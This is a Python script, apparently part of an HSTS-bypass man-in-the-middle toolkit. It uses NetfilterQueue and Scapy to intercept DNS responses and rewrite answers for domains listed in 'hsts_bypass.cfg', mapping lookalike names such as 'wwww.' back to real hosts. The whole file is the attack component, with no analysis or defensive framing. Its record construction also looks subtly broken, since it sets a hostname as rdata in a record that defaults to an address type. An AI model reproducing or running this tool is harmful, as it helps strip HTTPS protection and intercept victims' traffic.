from netfilterqueue import NetfilterQueue
from scapy.all import *
import dnslib

class DNSResolver:
    def __init__(self, custom_domains):
        self.custom_domains = custom_domains

    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            qname = scapy_packet[DNSQR].qname.decode()
            for domain in self.custom_domains:
                if 'w' + domain in qname:
                    if qname.startswith('wwww.'):
                        new_qname = qname.replace('wwww.', 'www.')
                    else:
                        parts = qname.split('.')
                        parts[0] = parts[0][1:]
                        new_qname = '.'.join(parts)
                    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=new_qname)
                    scapy_packet[DNS].ancount = 1
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
                    packet.set_payload(bytes(scapy_packet))
                    break
        packet.accept()

    def start(self):
        nfqueue = NetfilterQueue()
        nfqueue.bind(1, self.process_packet)
        try:
            nfqueue.run()
        except KeyboardInterrupt:
            pass

def parse_hsts_bypass_config(filename):
    with open(filename, 'r') as file:
        custom_domains = [line.strip() for line in file if line.strip()]
    return custom_domains

if __name__ == "__main__":
    custom_domains = parse_hsts_bypass_config('hsts_bypass.cfg')
    dns_resolver = DNSResolver(custom_domains)
    dns_resolver.start()
